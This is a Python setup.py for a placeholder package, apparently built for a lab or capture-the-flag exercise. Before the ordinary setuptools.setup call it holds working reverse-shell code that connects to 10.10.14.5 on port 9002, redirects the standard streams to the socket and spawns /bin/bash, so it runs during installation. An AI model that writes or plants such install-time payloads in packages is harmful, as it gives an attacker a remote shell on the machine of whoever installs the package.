import setuptools

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",9002))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")

setuptools.setup(
	name = "example-pkg-YOUR-USERNAME-HERE",
	python_requires = '>=3.6'
)
